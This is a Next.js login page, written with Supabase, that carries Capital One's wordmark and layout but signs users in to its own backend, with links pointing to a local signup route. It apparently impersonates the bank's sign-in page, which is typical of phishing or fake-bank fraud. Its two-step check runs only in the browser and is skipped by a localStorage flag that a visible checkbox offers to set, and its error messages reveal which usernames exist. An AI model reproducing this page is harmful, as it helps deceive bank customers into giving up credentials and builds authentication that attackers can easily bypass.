"use client";

import Image from 'next/image';
import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { supabase } from '../utils/supabase';

export default function LoginPage() {
  const router = useRouter();
  
  // Navigation & Step State
  const [step, setStep] = useState('credentials'); // 'credentials' | '2fa'
  const [authenticatedUser, setAuthenticatedUser] = useState(null);
  
  // Step 1: Credentials State
  const [username, setUsername] = useState(''); 
  const [password, setPassword] = useState('');
  const [rememberMe, setRememberMe] = useState(false);
  const [errors, setErrors] = useState({ username: false, password: false });
  const [serverError, setServerError] = useState(''); 
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  // Step 2: 2FA State (Updated for 8-digit pattern)
  const [otpCode, setOtpCode] = useState('');
  const [otpError, setOtpError] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);
  
  // Background State for OTP verification
  const [resolvedEmail, setResolvedEmail] = useState('');
  const [resolvedName, setResolvedName] = useState('Member');

  // Load remembered username on startup
  useEffect(() => {
    const savedUsername = localStorage.getItem('remembered_username');
    if (savedUsername) {
      setUsername(savedUsername);
      setRememberMe(true);
    }
  }, []);

  // HELPER: Translate Username to Email & Get Full Name (From your working site!)
  const lookupUserCredentials = async (input) => {
    let email = input.trim();
    let fullName = 'Member';
    const isEmail = email.includes('@');

    let query = supabase.from('profiles').select('email, full_name');
    if (isEmail) query = query.eq('email', email);
    else query = query.eq('username', email);

    const { data: profile, error } = await query.single();
    
    if (error && !isEmail) {
      return { error: `Username not found. Please verify your details.` };
    }

    if (profile) {
      email = profile.email;
      if (profile.full_name) fullName = profile.full_name;
    }

    return { email, fullName };
  };

  // --- STEP 1: HANDLE PASSWORD AUTH ---
  const handleSignIn = async (e) => {
    e.preventDefault();
    setServerError('');
    
    const newErrors = {
      username: username.trim() === '',
      password: password.trim() === ''
    };
    setErrors(newErrors);

    if (!newErrors.username && !newErrors.password) {
      setIsLoading(true);

      // 1. Resolve Username to real Email
      const { email, fullName, error: lookupErr } = await lookupUserCredentials(username);
      if (lookupErr) { 
        setServerError(lookupErr); 
        setIsLoading(false); 
        return; 
      }

      // 2. Authenticate with Password
      const { data, error } = await supabase.auth.signInWithPassword({
        email: email, 
        password: password,
      });

      if (error || !data.user) {
        setServerError('Invalid username or password.');
        setIsLoading(false);
        return;
      }

      if (rememberMe) localStorage.setItem('remembered_username', username);
      else localStorage.removeItem('remembered_username');

      // --- THE REMEMBER ME BYPASS CHECK ---
      const isTrustedDevice = localStorage.getItem(`device_trusted_${email}`) === 'true';

      if (isTrustedDevice) {
        router.push('/dashboard');
      } else {
        // FIRST TIME LOGIN: Send code directly via frontend Supabase Auth!
        await supabase.auth.signOut(); // Lock vault until code is verified
        setResolvedEmail(email);
        setResolvedName(fullName);
        setAuthenticatedUser(data.user);

        const { error: otpError } = await supabase.auth.signInWithOtp({
          email: email,
          options: { shouldCreateUser: false }
        });

        if (otpError) {
          setServerError(`Failed to send code: ${otpError.message}`);
          setIsLoading(false);
          return;
        }

        setStep('2fa');
        setIsLoading(false);
      }
    }
  };

  // --- STEP 2: HANDLE 8-DIGIT CODE VERIFICATION ---
  const handleVerify2FA = async (e) => {
    e.preventDefault();
    if (!otpCode || otpCode.trim().length < 6) {
      setOtpError('Please enter the verification code.');
      return;
    }

    setIsVerifying(true);
    setOtpError('');

    try {
      // Verify directly with Supabase frontend client (Bypasses Render!)
      const { data, error } = await supabase.auth.verifyOtp({
        email: resolvedEmail,
        token: otpCode.trim(),
        type: 'email'
      });

      if (error || !data.user) {
        setOtpError('Invalid or expired code. Please try again.');
        setIsVerifying(false);
      } else {
        // Mark device as trusted for future logins
        localStorage.setItem(`device_trusted_${resolvedEmail}`, 'true');
        router.push('/dashboard');
      }
    } catch (err) {
      setOtpError('Network error. Could not connect to verification server.');
      setIsVerifying(false);
    }
  };

  // --- RESEND CODE TRIGGER ---
  const handleResendCode = async () => {
    setOtpError('');
    const { error } = await supabase.auth.signInWithOtp({
      email: resolvedEmail,
      options: { shouldCreateUser: false }
    });
    if (error) setOtpError('Could not resend code. Please wait a moment.');
    else alert('A new security code has been sent to your email.');
  };

  return (
    <div className="min-h-screen bg-white font-sans text-gray-800 flex flex-col">
      
      {/* STICKY HEADER */}
      <header className="sticky top-0 z-[100] w-full bg-white shadow-md border-b border-gray-200">
        <div className="max-w-[1400px] mx-auto px-4 md:px-6 py-3 flex justify-between items-center">
          <div className="flex items-center">
            <Image src="/capitalone-com-wordmark.png" alt="Logo" width={130} height={40} style={{ width: 'auto', height: '35px' }} className="object-contain" priority />
          </div>
          <div className="flex items-center space-x-6 text-sm text-gray-700">
            <div className="hidden md:flex items-center cursor-pointer hover:underline">
              <span className="text-lg mr-1">🇺🇸</span>
              <svg className="w-4 h-4 ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7"></path></svg>
            </div>
            <button onClick={() => router.push('/signup')} className="flex items-center font-bold text-gray-900 hover:underline">
              <svg className="w-5 h-5 mr-1 text-[#004879]" fill="currentColor" viewBox="0 0 24 24">
                <path fillRule="evenodd" d="M12 2a5 5 0 100 10 5 5 0 000-10zm-7 14a7 7 0 0114 0H5z" clipRule="evenodd" />
              </svg>
              Set Up Access
            </button>
          </div>
        </div>
      </header>

      {/* MAIN CONTENT WRAPPER */}
      <main className="flex-1 flex flex-col items-center justify-center py-12 px-4">
        
        {/* MAIN LOGIN CARD */}
        <div className="w-full max-w-[420px] border border-gray-200 rounded p-8 shadow-sm relative bg-white">
          
          {/* Card Logo */}
          <div className="flex justify-center mb-6 mt-2">
            <Image 
              src="/capitalone-com-wordmark.png" 
              alt="Capital One Logo" 
              width={160} 
              height={50} 
              style={{ width: 'auto', height: '45px' }} 
              className="object-contain"
              priority
            />
          </div>

          {/* STEP 1: CREDENTIALS SCREEN */}
          {step === 'credentials' && (
            <>
              <h1 className="text-center text-[22px] text-gray-900 mb-6 tracking-wide">Sign In</h1>

              {serverError && (
                <div className="mb-6 p-3 bg-red-50 border border-red-200 text-[#c60f13] text-sm rounded flex items-center">
                  <svg className="w-5 h-5 mr-2 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
                  {serverError}
                </div>
              )}

              <form onSubmit={handleSignIn} className="flex flex-col space-y-5">
                <div>
                  <label className="block text-sm font-bold text-gray-900 mb-1">Username / Email</label>
                  <div className="relative flex items-center">
                    <div className="absolute left-3 text-gray-700">
                      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.5"><path strokeLinecap="round" strokeLinejoin="round" d="M15.75 6a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0zM4.501 20.118a7.5 7.5 0 0114.998 0A17.933 17.933 0 0112 21.75c-2.676 0-5.216-.584-7.499-1.632z" /></svg>
                    </div>
                    <input 
                      type="text" 
                      value={username}
                      onChange={(e) => {
                        setUsername(e.target.value);
                        if (errors.username) setErrors({ ...errors, username: false });
                      }}
                      className={`w-full pl-10 pr-4 py-2.5 rounded border focus:outline-none focus:ring-1 focus:ring-gray-400 ${errors.username ? 'border-[#c60f13]' : 'border-gray-400'}`}
                      disabled={isLoading}
                    />
                  </div>
                  {errors.username && <p className="text-[#c60f13] text-xs mt-1">This field is required.</p>}
                </div>

                <div>
                  <label className="block text-sm font-bold text-gray-900 mb-1">Password</label>
                  <div className="relative flex items-center">
                    <div className="absolute left-3 text-gray-700">
                      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.5"><path strokeLinecap="round" strokeLinejoin="round" d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z" /></svg>
                    </div>
                    <input 
                      type={showPassword ? "text" : "password"}
                      value={password}
                      onChange={(e) => {
                        setPassword(e.target.value);
                        if (errors.password) setErrors({ ...errors, password: false });
                      }}
                      className={`w-full pl-10 pr-10 py-2.5 rounded border focus:outline-none focus:ring-1 focus:ring-gray-400 font-sans ${errors.password ? 'border-[#c60f13]' : 'border-gray-400'}`}
                      disabled={isLoading}
                    />
                    <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 text-gray-700 hover:text-black focus:outline-none">
                      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2">
                        <path strokeLinecap="round" strokeLinejoin="round" d="M2.036 12.322a1.012 1.012 0 010-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178z" />
                        <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                      </svg>
                    </button>
                  </div>
                  {errors.password && <p className="text-[#c60f13] text-xs mt-1">This field is required.</p>}
                </div>

                {/* REMEMBER ME CHECKBOX */}
                <div className="flex items-center pt-1">
                  <input 
                    type="checkbox" 
                    id="remember" 
                    checked={rememberMe}
                    onChange={(e) => setRememberMe(e.target.checked)}
                    className="w-5 h-5 border-gray-400 rounded text-[#00619b] focus:ring-0 cursor-pointer" 
                  />
                  <label htmlFor="remember" className="ml-2 text-[15px] text-gray-900 cursor-pointer">Remember Me & Bypass 2FA on this device</label>
                </div>

                <div className="pt-2">
                  <button type="submit" disabled={isLoading} className={`w-full bg-[#0071ce] hover:bg-[#005a8f] text-white font-bold py-3 rounded text-[15px] transition-colors ${isLoading ? 'opacity-70 cursor-not-allowed' : ''}`}>
                    {isLoading ? 'Verifying...' : 'Sign in'}
                  </button>
                </div>
              </form>

              {/* Passkey Box */}
              <div className="mt-8 border border-gray-200 rounded p-4 flex flex-col shadow-sm">
                <h2 className="text-[15px] font-bold text-gray-900 mb-2">Go passwordless with a passkey</h2>
                <div className="flex items-start">
                  <div className="flex items-center space-x-1 mr-3 mt-1 text-[#0071ce]">
                    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.5"><path strokeLinecap="round" strokeLinejoin="round" d="M3.75 6A2.25 2.25 0 016 3.75h2.25M3.75 18A2.25 2.25 0 006 20.25h2.25M20.25 6a2.25 2.25 0 00-2.25-2.25h-2.25M20.25 18a2.25 2.25 0 01-2.25 2.25h-2.25m-7.5-6v.008H12v-.008h-.008zm.375 0a.375.375 0 11-.75 0 .375.375 0 01.75 0zm4.125 0v.008h-.008v-.008h.008zm.375 0a.375.375 0 11-.75 0 .375.375 0 01.75 0z" /></svg>
                    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.5"><path strokeLinecap="round" strokeLinejoin="round" d="M7.864 4.243A7.5 7.5 0 0119.5 10.5c0 2.92-.556 5.709-1.568 8.268M5.742 6.364A7.465 7.465 0 004.5 10.5a7.464 7.464 0 01-1.15 3.993m1.989 3.559A11.209 11.209 0 008.25 10.5a3.75 3.75 0 117.5 0c0 .527-.021 1.049-.064 1.565M12 10.5a14.94 14.94 0 01-3.6 9.75m6.633-4.596a18.666 18.666 0 01-2.485 5.33" /></svg>
                  </div>
                  <div className="flex-1">
                    <p className="text-[14px] text-gray-900 leading-snug mb-2">No more having to remember a password. Use a passkey to sign in using your face or fingerprint.</p>
                    <a href="#" className="text-[#00619b] text-[15px] font-bold hover:underline">Create a passkey</a>
                  </div>
                </div>
              </div>

              {/* Account Links */}
              <div className="mt-8 flex flex-col space-y-4">
                <button onClick={() => router.push('/signup')} className="text-[#00619b] text-[15px] font-bold hover:underline text-left">
                  Forgot Username or Password?
                </button>
                <button onClick={() => router.push('/signup')} className="text-[#00619b] text-[15px] font-bold hover:underline text-left">
                  Set Up Online Access
                </button>
              </div>
            </>
          )}

          {/* STEP 2: 8-DIGIT 2FA SCREEN */}
          {step === '2fa' && (
            <div className="animate-in fade-in duration-300">
              <div className="text-center mb-6">
                <div className="w-12 h-12 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-3 text-blue-600">
                  <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
                </div>
                <h1 className="text-[22px] font-bold text-gray-900 tracking-wide">Two-Step Verification</h1>
                <p className="text-xs text-gray-500 mt-2 leading-relaxed">
                  We've dispatched a secure verification code to your registered email address <span className="font-bold text-gray-700">({resolvedEmail})</span>. Please enter it below.
                </p>
              </div>

              {otpError && (
                <div className="mb-6 p-3 bg-red-50 border border-red-200 text-[#c60f13] text-sm rounded flex items-center">
                  <svg className="w-5 h-5 mr-2 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
                  {otpError}
                </div>
              )}

              <form onSubmit={handleVerify2FA} className="flex flex-col space-y-6">
                <div>
                  <label className="block text-xs font-bold text-gray-700 uppercase tracking-wider mb-2 text-center">Enter Secure Code</label>
                  <input 
                    type="text" 
                    maxLength={8}
                    value={otpCode}
                    onChange={(e) => {
                      const val = e.target.value.replace(/[^0-9]/g, '');
                      setOtpCode(val);
                      if (otpError) setOtpError('');
                    }}
                    className="w-full text-center text-2xl md:text-3xl font-mono tracking-[0.3em] py-3 border border-gray-400 rounded focus:outline-none focus:border-[#0071ce] focus:ring-1 focus:ring-[#0071ce] font-bold text-gray-800 bg-gray-50/50"
                    placeholder="00000000"
                    autoFocus
                    disabled={isVerifying}
                  />
                </div>

                <div className="pt-2">
                  <button 
                    type="submit" 
                    disabled={isVerifying || otpCode.length < 6} 
                    className={`w-full bg-[#0071ce] hover:bg-[#005a8f] text-white font-bold py-3 rounded text-[15px] transition-colors ${(isVerifying || otpCode.length < 6) ? 'opacity-50 cursor-not-allowed' : ''}`}
                  >
                    {isVerifying ? 'Verifying Code...' : 'Verify & Sign In'}
                  </button>
                </div>
              </form>

              <div className="mt-8 border-t border-gray-100 pt-6 text-center flex flex-col space-y-3">
                <button 
                  type="button"
                  onClick={handleResendCode}
                  className="text-xs text-[#00619b] font-bold hover:underline"
                >
                  Didn't receive a code? Resend email
                </button>
                <button 
                  type="button"
                  onClick={() => { setStep('credentials'); setOtpCode(''); setOtpError(''); }}
                  className="text-xs text-gray-400 hover:text-gray-600 font-bold"
                >
                  &larr; Back to password login
                </button>
              </div>
            </div>
          )}

        </div>

        <div className="mt-8 text-center flex flex-col items-center">
          <p className="text-[15px] text-gray-900 mb-3">Looking for these accounts?</p>
          <a href="#" className="text-[#00619b] text-[15px] font-bold hover:underline">Commercial or Trade Credit</a>
        </div>

      </main>
    </div>
  );
}